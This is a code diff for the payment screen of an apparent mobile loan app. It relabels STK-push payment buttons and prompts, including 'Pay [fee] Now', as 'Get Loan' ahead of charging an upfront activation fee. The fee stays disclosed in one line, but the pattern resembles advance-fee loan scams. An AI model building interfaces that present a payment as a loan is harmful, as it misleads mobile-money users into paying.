@@ -284,7 +284,7 @@ function PaymentContent() {
 
           <h2 className="text-3xl font-black mb-2 tracking-tight">CHECK YOUR PHONE</h2>
           <p className="text-white/80 text-sm mb-4">
-            STK push prompt sent to:
+            Payment prompt sent to:
           </p>
           <p className="text-2xl font-bold mb-4 flex items-center justify-center gap-2">
             <Phone className="w-5 h-5" />
@@ -355,7 +355,7 @@ function PaymentContent() {
                   <Zap className="w-10 h-10 text-white animate-pulse" />
                 </div>
               </div>
-              <h2 className="font-bold text-lg mb-2">Sending STK Push...</h2>
+              <h2 className="font-bold text-lg mb-2">Getting your loan...</h2>
               <p className="text-gray-500 text-sm mb-4">
                 Sending payment prompt to <strong>{phone}</strong>
               </p>
@@ -385,7 +385,7 @@ function PaymentContent() {
                 disabled={!phone || phone.length < 10}
                 className="w-full gradient-mkopa text-white py-3 rounded-lg font-semibold disabled:opacity-40 flex items-center justify-center gap-2"
               >
-                <Smartphone className="w-5 h-5" /> Send STK Push
+                <Smartphone className="w-5 h-5" /> Get Loan
               </button>
               {error && <p className="text-red-500 text-sm mt-3">{error}</p>}
             </>
@@ -394,9 +394,9 @@ function PaymentContent() {
               <div className="w-16 h-16 bg-mkopa-green/10 rounded-full flex items-center justify-center mx-auto mb-3">
                 <Smartphone className="w-8 h-8 text-mkopa-green" />
               </div>
-              <h2 className="font-bold text-lg mb-1">Ready to Send STK Push</h2>
+              <h2 className="font-bold text-lg mb-1">Ready to Get Loan</h2>
               <p className="text-gray-500 text-sm mb-4">
-                Payment prompt will be sent to:
+                {formatKES(loan.activationFee)} will be deducted from your M-Pesa / Airtel wallet after you enter your PIN.
               </p>
               <p className="text-lg font-bold text-mkopa-green mb-4 flex items-center justify-center gap-1">
                 <Phone className="w-4 h-4" /> {phone}
@@ -408,7 +408,7 @@ function PaymentContent() {
                 onClick={() => { autoTriggered.current = false; triggerStkPush(); }}
                 className="w-full gradient-mkopa text-white py-3 rounded-lg font-semibold flex items-center justify-center gap-2"
               >
-                <Zap className="w-5 h-5" /> Pay {formatKES(loan.activationFee)} Now
+                <Zap className="w-5 h-5" /> Get Loan
               </button>
               <button
                 onClick={() => setPhoneEditable(true)}
@@ -422,9 +422,9 @@ function PaymentContent() {
           <div className="mt-5 p-3 bg-green-50 rounded-lg text-xs text-green-700 text-left">
             <p className="font-semibold mb-1">How it works:</p>
             <ol className="list-decimal list-inside space-y-0.5">
-              <li>STK prompt appears on your phone screen (over other apps)</li>
-              <li>Enter your M-Pesa / Airtel PIN</li>
-              <li>{formatKES(loan.activationFee)} deducted automatically</li>
+              <li>Tap "Get Loan" — a payment prompt appears on your phone</li>
+              <li>Enter your M-Pesa / Airtel PIN to authorize</li>
+              <li>{formatKES(loan.activationFee)} is deducted from your wallet</li>
               <li>Loan activated instantly — done!</li>
             </ol>
           </div>
